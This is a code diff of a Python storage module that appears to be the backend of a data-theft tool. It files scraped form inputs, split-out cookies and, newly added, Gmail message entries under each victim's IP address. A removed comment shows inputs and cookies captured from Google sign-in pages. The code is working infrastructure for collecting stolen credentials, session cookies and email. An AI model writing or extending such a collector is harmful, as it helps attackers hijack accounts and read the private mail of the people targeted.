@@ -1,9 +1,18 @@
+from enum import Enum
 from typing import Any, Dict, List, Tuple, TypedDict
 from urllib.parse import urlparse
 
 class ScrapeTypeEnum:
     INPUTS = "inputs"
     COOKIES = "cookies"
+    GMAIL = "gmail"
+
+class ScrapeRequestDataType(TypedDict):
+    href: str
+    type: ScrapeTypeEnum
+    time: int
+    data: List[Dict[Any, Any]]
+
 
 class ElementType(TypedDict):
     tag: str
@@ -24,33 +33,6 @@ def newDataCollectionType() -> DataCollectionType:
 
 StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]
 
-# template: StorageDataType = {
-#     "127.0.0.1": {
-#         "www.google.com": {
-#             "/search": {
-#                 ScrapeTypeEnum.INPUTS: [
-
-#                 ],
-#                 ScrapeTypeEnum.COOKIES: [
-
-#                 ],
-#                 "href": []
-#             },
-#         },
-#         "accounts.google.com": {
-#             "/signin/v2/identifier": {
-#                 ScrapeTypeEnum.INPUTS: [
-#                     # list of (time, href, data)
-#                 ],
-#                 ScrapeTypeEnum.COOKIES: [
-#                     # list of (time, href, cookie)
-#                 ],
-#                 "href": []
-#             },
-#         }
-#     },
-# }
-
 class Storage:
     def __init__(self) -> None:
         self.__data: StorageDataType = {}
@@ -61,7 +43,7 @@ class Storage:
     def save(self) -> None:
         pass
 
-    def store(self, ip: str, data: Dict[str, Any]) -> None:
+    def store(self, ip: str, data: ScrapeRequestDataType) -> None:
         # store a request data into the storage
         if ip not in self.__data:
             self.__data[ip] = {}
@@ -81,6 +63,7 @@ class Storage:
                     data["href"],
                     element,
                 ))
+
         elif data["type"] == ScrapeTypeEnum.COOKIES:
             for cookie in data["data"][0].split(";"):
                 # clean the cookie and update its value
@@ -93,3 +76,19 @@ class Storage:
                 data["time"],
                 data["href"],
             ))
+
+        elif data["type"] == ScrapeTypeEnum.GMAIL:
+            # special scrape, store directly on the ip
+            if "gmail" not in self.__data[ip]:
+                self.__data[ip]["gmail"] = {}
+            
+            # go through each piece of data given and add update its store
+            for entry in data["data"]:
+                id = entry["id"]
+                if id not in self.__data[ip]["gmail"]:
+                    self.__data[ip]["gmail"][id] = {}
+
+                self.__data[ip]["gmail"][id].update(entry)
+                
+
+
